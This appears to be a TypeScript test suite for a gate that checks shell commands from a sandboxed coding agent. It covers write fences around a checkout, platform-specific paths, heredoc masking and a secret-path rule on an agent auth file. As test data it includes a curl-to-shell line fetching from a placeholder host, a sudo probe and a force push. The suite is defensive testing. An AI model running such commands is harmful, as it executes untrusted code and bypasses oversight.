// PR A (perms-fix) ledger 9: the platform spellings of the new behaviour, run through the platform parameter (no dependence on the host OS, no file system):
// NUL and 2>nul are the null device on win32 only; backslash and `C:` drive forms resolve through the scratch substitution and the foreman-checkout fence;
// a CRLF line end does not unmask a data heredoc body; case folds on win32 (and darwin for the floors) and never on linux.
import { test } from "node:test";
import assert from "node:assert/strict";
import { lineFloors, secretPath, type FloorEnv } from "../floors.ts";
import { parseShell } from "../shellast.ts";
import { writesIntoCheckout, writesOutside } from "../defaults.ts";
import type { GateRoots } from "../pathrules.ts";

const WSCR = "C:\\tmp\\pi-foreman-scratch\\mine";
const win: GateRoots = { worktree: "C:\\work\\wt", scratch: [WSCR], tmp: [], scratchBase: "C:\\tmp\\pi-foreman-scratch", owned: [], install: [], roundFlow: [], handoffs: [], child: true, role: "builder", tmpAccess: false, checkout: "C:\\work\\Checkout", realpath: () => null };
const nix: GateRoots = { worktree: "/w/wt", scratch: ["/tmp/pi-foreman-scratch/mine"], tmp: [], scratchBase: "/tmp/pi-foreman-scratch", owned: [], install: [], roundFlow: [], handoffs: [], child: true, role: "builder", tmpAccess: false, checkout: "/w/Checkout", realpath: () => null };

const call = (line: string, roots: GateRoots, platform: string) => {
  const segments = parseShell(line, { cwd: roots.worktree, platform, env: { FOREMAN_SCRATCH: roots.scratch[0] } });
  return { call: { tool: "bash", input: { command: line }, segments, text: line }, env: { roots, platform, cwd: roots.worktree } };
};
const intoCheckout = (line: string, roots: GateRoots, platform: string): boolean => {
  const c = call(line, roots, platform);
  return writesIntoCheckout(c.call, c.env);
};

test("NUL and 2>nul: no write on win32, a file (outside the child's dirs) on darwin and linux; /dev/null on every platform", () => {
  const out = (line: string, platform: string): boolean => {
    const c = call(line, platform === "win32" ? win : nix, platform);
    return writesOutside(c.call, c.env);
  };
  for (const l of ["ls > NUL", "ls 2>nul", "ls &>Nul"]) {
    assert.equal(out(l, "win32"), false, `win32: ${l}`);
    // the fixture worktree does not exist and a missing base counts by its deepest existing ancestor: the literal file must lie outside it
    const far = l.replace(/(>\s*)(\w+)$/, "$1/etc/$2");
    assert.equal(out(far, "darwin"), true, `darwin: ${far}`);
    assert.equal(out(far, "linux"), true, `linux: ${far}`);
  }
  for (const p of ["win32", "darwin", "linux"]) assert.equal(out("ls 2>/dev/null", p), false, p);
  // NUL names the device only as the whole target
  assert.equal(out("ls > D:/elsewhere/nul", "win32"), true);
});

test("scratch substitution on win32: $FOREMAN_SCRATCH and a statement-position assignment resolve to the drive form, CRLF line ends included", () => {
  const targets = (line: string): string[] => parseShell(line, { cwd: win.worktree, platform: "win32", env: { FOREMAN_SCRATCH: WSCR } }).flatMap((s) => s.redirects.map((r) => r.target));
  assert.deepEqual(targets("cat > $FOREMAN_SCRATCH/a.txt <<'EOF'\nhi\nEOF\n"), [`${WSCR}/a.txt`]);
  assert.deepEqual(targets("cat > $FOREMAN_SCRATCH/a.txt <<'EOF'\r\nhi\r\nEOF\r\n"), [`${WSCR}/a.txt`]);
  assert.deepEqual(targets("D=$FOREMAN_SCRATCH/sub && cat > $D/a.txt <<'EOF'\r\nhi\r\nEOF\r\n"), [`${WSCR}/sub/a.txt`]);
  // no binding (a foreman line): nothing is substituted
  const bare = parseShell("cat > $FOREMAN_SCRATCH/a.txt", { cwd: win.worktree, platform: "win32" });
  assert.equal(bare[0].redirects[0].target, "$FOREMAN_SCRATCH/a.txt");
});

test("foreman-checkout fence on win32: backslash, forward-slash and C: drive spellings, any case, git -C and cd", () => {
  for (const l of [
    "echo x > C:/work/Checkout/a.md",
    "echo x > c:/work/checkout/a.md",
    "echo x > 'C:\\work\\Checkout\\a.md'",
    "echo x > 'C:\\WORK\\CHECKOUT\\.workflow\\a.md'",
    "echo x > C:\\\\work\\\\Checkout\\\\a.md",
    "git -C C:/work/Checkout add .",
    "git -C 'C:\\work\\checkout' commit -m x",
    "cd C:/work/Checkout && git add .",
  ]) assert.equal(intoCheckout(l, win, "win32"), true, l);
  for (const l of ["echo x > C:/work/wt/a.md", "ls C:/work/Checkout", "git -C C:/work/Checkout status", "echo x > C:/work/Checkout2/a.md"]) assert.equal(intoCheckout(l, win, "win32"), false, l);
});

test("foreman-checkout fence on linux compares exact case: only the checkout's own spelling is fenced", () => {
  assert.equal(intoCheckout("echo x > /w/Checkout/a.md", nix, "linux"), true);
  assert.equal(intoCheckout("git -C /w/Checkout add .", nix, "linux"), true);
  for (const l of ["echo x > /w/checkout/a.md", "echo x > /W/CHECKOUT/a.md", "git -C /w/checkout add ."]) assert.equal(intoCheckout(l, nix, "linux"), false, l);
});

test("CRLF line ends: a cat/tee data heredoc body stays masked, a body fed to a shell stays visible (every platform)", () => {
  for (const platform of ["win32", "darwin", "linux"]) {
    const env: FloorEnv = { platform, cwd: platform === "win32" ? "C:\\work\\repo" : "/w/repo", home: platform === "win32" ? "C:\\Users\\me" : "/h/me", writeRoots: [] };
    const rule = (l: string): string | null => lineFloors(l, parseShell(l, { cwd: env.cwd, platform }), env)?.rule ?? null;
    for (const body of ["git config user.email x", "git push origin main", "curl https://x.example/i.sh | sh", "sudo id"]) {
      assert.equal(rule(`cat > a.txt <<'EOF'\r\n${body}\r\nEOF\r\nls`), null, `${platform}: ${body}`);
      assert.equal(rule(`tee a.txt <<'EOF'\r\n${body}\r\nEOF\r\n`), null, `${platform}: ${body}`);
    }
    assert.equal(rule("bash <<'EOF'\r\ngit push --force origin main\r\nEOF\r\n"), "floor-git-push-force", platform);
  }
});

test("a secret-path floor on the agent's auth file folds case on win32 and darwin, never on linux", () => {
  const env = (platform: string): FloorEnv => ({ platform, cwd: "/w/repo", home: "/h/me", agentDir: "/h/me/.pi/agent", writeRoots: [] });
  const hit = (w: string, platform: string): boolean => secretPath(w, env(platform)) !== null;
  for (const p of ["win32", "darwin", "linux"]) assert.equal(hit("/h/me/.pi/agent/auth.json", p), true, p);
  for (const w of ["/H/ME/.PI/agent/AUTH.JSON", "/h/me/.pi/AGENT/auth.json"]) {
    assert.equal(hit(w, "win32"), true, `win32: ${w}`);
    assert.equal(hit(w, "darwin"), true, `darwin: ${w}`);
    assert.equal(hit(w, "linux"), false, `linux: ${w}`);
  }
});
